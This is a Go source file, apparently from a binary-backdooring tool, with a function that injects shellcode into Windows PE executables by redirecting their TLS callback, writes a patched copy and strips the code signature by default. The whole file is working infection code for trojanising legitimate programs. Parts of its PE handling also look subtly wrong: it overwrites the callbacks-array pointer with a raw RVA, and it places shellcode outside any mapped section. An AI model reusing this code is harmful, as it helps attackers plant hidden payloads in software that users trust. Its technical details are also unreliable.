package injector

import (
	"encoding/binary"
	"fmt"
	"os"

	"github.com/Binject/debug/pe"
)

// injectTLS performs TLS callback injection
// This method adds a TLS callback that executes before the main entry point
func (i *Injector) injectTLS(pePath string, shellcode []byte) (*Result, error) {
	// Open PE file
	file, err := pe.Open(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to open PE file: %v", err),
		}, err
	}
	defer file.Close()

	// Read the original file
	data, err := os.ReadFile(pePath)
	if err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to read PE file: %v", err),
		}, err
	}

	// Check if TLS directory exists
	var tlsDirOffset uint32
	var hasTLS bool

	peOffset := binary.LittleEndian.Uint32(data[60:64])
	optHeaderOffset := peOffset + 4
	magic := binary.LittleEndian.Uint16(data[optHeaderOffset : optHeaderOffset+2])

	// TLS directory is at index 9 in data directories
	var tlsDirRVA uint32
	if magic == 0x10b { // PE32
		numRvaAndSizes := binary.LittleEndian.Uint32(data[optHeaderOffset+92 : optHeaderOffset+96])
		if numRvaAndSizes > 9 {
			tlsDirRVA = binary.LittleEndian.Uint32(data[optHeaderOffset+144 : optHeaderOffset+148])
		}
	} else if magic == 0x20b { // PE32+
		numRvaAndSizes := binary.LittleEndian.Uint32(data[optHeaderOffset+108 : optHeaderOffset+112])
		if numRvaAndSizes > 9 {
			tlsDirRVA = binary.LittleEndian.Uint32(data[optHeaderOffset+160 : optHeaderOffset+164])
		}
	}

	hasTLS = tlsDirRVA != 0

	// Find space for shellcode at end of file
	shellcodeOffset := len(data)

	// Align to 16 bytes
	alignedSize := (len(shellcode) + 15) & ^15

	// Extend file
	newData := make([]byte, len(data)+alignedSize+256) // Extra space for TLS structures
	copy(newData, data)
	copy(newData[shellcodeOffset:], shellcode)

	// If no TLS directory, create one
	if !hasTLS {
		// This is a simplified implementation
		// A full implementation would need to:
		// 1. Create a new TLS directory
		// 2. Add a TLS callback pointing to shellcode
		// 3. Update the data directory

		return &Result{
			Success: false,
			Message: "Target PE has no TLS directory. TLS injection requires existing TLS or complex PE modification.",
		}, fmt.Errorf("no existing TLS directory")
	}

	// Convert TLS RVA to file offset
	if tlsDirOffset, err = rvaToFileOffsetFromData(newData, tlsDirRVA); err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to find TLS directory: %v", err),
		}, err
	}

	// TLS directory structure:
	// +0: StartAddressOfRawData (4/8 bytes)
	// +4/8: EndAddressOfRawData (4/8 bytes)
	// +8/16: AddressOfIndex (4/8 bytes)
	// +12/24: AddressOfCallBacks (4/8 bytes)
	// +16/32: SizeOfZeroFill (4 bytes)
	// +20/36: Characteristics (4 bytes)

	var callbackOffset uint32
	if magic == 0x10b { // PE32
		callbackOffset = tlsDirOffset + 12
	} else { // PE32+
		callbackOffset = tlsDirOffset + 24
	}

	// Store original callback address
	var origCallback uint64
	if magic == 0x10b {
		origCallback = uint64(binary.LittleEndian.Uint32(newData[callbackOffset : callbackOffset+4]))
	} else {
		origCallback = binary.LittleEndian.Uint64(newData[callbackOffset : callbackOffset+8])
	}

	// Calculate shellcode RVA
	shellcodeRVA, err := fileOffsetToRVA(file, uint32(shellcodeOffset))
	if err != nil {
		shellcodeRVA = uint32(shellcodeOffset) // Fallback
	}

	// Update callback to point to shellcode
	if magic == 0x10b {
		binary.LittleEndian.PutUint32(newData[callbackOffset:], shellcodeRVA)
	} else {
		binary.LittleEndian.PutUint64(newData[callbackOffset:], uint64(shellcodeRVA))
	}

	// Output path
	outputPath := pePath + ".patched"

	// Write modified file
	if err := os.WriteFile(outputPath, newData, 0644); err != nil {
		return &Result{
			Success: false,
			Message: fmt.Sprintf("Failed to write output file: %v", err),
		}, err
	}

	// Clear signature if not preserving
	if !i.options.PreserveSig {
		if err := ClearSignature(outputPath); err != nil {
			fmt.Printf("Warning: failed to clear signature: %v\n", err)
		}
	}

	return &Result{
		Success:    true,
		Message:    fmt.Sprintf("TLS injection successful. Shellcode at RVA 0x%X (orig callback: 0x%X)", shellcodeRVA, origCallback),
		OutputPath: outputPath,
	}, nil
}

// rvaToFileOffsetFromData converts RVA to file offset from raw data
func rvaToFileOffsetFromData(data []byte, rva uint32) (uint32, error) {
	peOffset := binary.LittleEndian.Uint32(data[60:64])
	coffOffset := peOffset + 4
	optHeaderSize := binary.LittleEndian.Uint16(data[coffOffset+16 : coffOffset+18])
	numSections := binary.LittleEndian.Uint16(data[coffOffset+2 : coffOffset+4])
	sectionOffset := coffOffset + 20 + uint32(optHeaderSize)

	for i := uint16(0); i < numSections; i++ {
		secOffset := sectionOffset + uint32(i)*40
		virtualAddr := binary.LittleEndian.Uint32(data[secOffset+12 : secOffset+16])
		virtualSize := binary.LittleEndian.Uint32(data[secOffset+8 : secOffset+12])
		rawOffset := binary.LittleEndian.Uint32(data[secOffset+20 : secOffset+24])

		if rva >= virtualAddr && rva < virtualAddr+virtualSize {
			return rawOffset + (rva - virtualAddr), nil
		}
	}

	return 0, fmt.Errorf("RVA not found in any section")
}
